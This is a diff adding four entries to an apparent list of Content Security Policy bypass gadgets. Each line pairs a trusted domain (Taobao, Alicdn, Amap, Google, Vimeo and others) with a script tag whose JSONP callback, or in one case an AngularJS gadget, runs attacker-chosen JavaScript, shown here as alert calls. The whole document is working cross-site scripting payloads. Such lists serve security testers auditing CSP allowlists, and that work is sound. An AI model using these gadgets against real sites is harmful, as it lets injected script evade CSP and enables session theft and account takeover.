@@ -101,6 +101,7 @@ gstatic.com	<script src='https://gstatic.com/recaptcha/about/js/main.min.js'></s
 gum.criteo.com	<script src="https://gum.criteo.com/sync?c=123&r=2&a=1&j=alert"></script>
 hcaptcha.com	<script src="https://hcaptcha.com/1/api.js?onload=alert&render=explicit"></script>
 help.afterpay.com	<script src="https://help.afterpay.com/sc/faye/?message=[{%22channel%22:%22%22}]&jsonp=alert"></script>
+i.taobao.com  <script src="https://i.taobao.com/json/my_taobao_remind_data.htm?&callback=alert?.(1)"></script>
 ib.adnxs.com	<script src="https://ib.adnxs.com/async_usersync?cbfn=alert(1)-"></script>
 info.cloudflare.com	<script src="https://info.cloudflare.com//index.php/form/getForm?munchkinId=194-VVC-221&form=1077&callback=alert"></script>
 info.elastic.co	<script src="https://info.elastic.co/index.php/form/getForm?munchkinId=813-MAM-392&form=6196&callback=alert"></script>
@@ -172,6 +173,7 @@ tagmanager.google.com	<script src="https://tagmanager.google.com/debug/api/vtinf
 tcr9i.openai.com	<script src="https://tcr9i.openai.com/fc/a/?callback=alert"></script>
 thehive.shopify.io	<script src="https://thehive.shopify.io/scripts/vendor.78eed977.js"></script><div ng-app><img src=x ng-on-error="window=$event.target.ownerDocument.defaultView;window.alert(window.origin);">
 thiscanbeanything.zendesk.com	<script src="https://thiscanbeanything.zendesk.com/sc/faye/?message=[{%22channel%22:%22%22}]&jsonp=alert"></script>
+time-ak.alicdn.com  <script src="https://time-ak.alicdn.com/t/gettime?callback=alert(1).toString"></script>
 translate.google.com	<script src="https://translate.google.com/translate_a/element.js?cb=alert"></script>
 translate.googleapis.com	<script src="https://translate.googleapis.com/$discovery/rest?version=v3&callback=alert();"></script>
 translate.yandex.net	<script src="https://translate.yandex.net/api/v1.5/tr.json/detect?callback=alert"></script>
@@ -189,6 +191,7 @@ vimeo.com	<script src="https://vimeo.com/api/v2/video/1006042481.json?callback=a
 visitor-service.tealiumiq.com	<script src="https://visitor-service.tealiumiq.com/northwesternmutual/main/q?callback=alert(1)"></script>
 visitor.pixplug.in	<script src="https://visitor.pixplug.in/jsonp/getdata.php?callback=alert(1)"></script>
 wb.amap.com	<script src="https://wb.amap.com/channel.php?callback=alert"></script>
+webapi.amap.com  <script src="https://webapi.amap.com/style2?callback=alert(1)"></script>
 widget.usersnap.com	<script src="https://widget.usersnap.com/load/d5abc654-0976-45b9-8074-fa5e721db433?onload=alert"></script>
 widgets.pinterest.com	<script src="https://widgets.pinterest.com/v3/pidgets/boards/ciciwin/hedgehog-squirrel-crafts/pins/?callback=alert"></script>
 wikipedia.org	<script src="https://en.wikipedia.org/w/api.php?action=opensearch&format=json&limit=5&callback=alert&search=renniepak"></script>
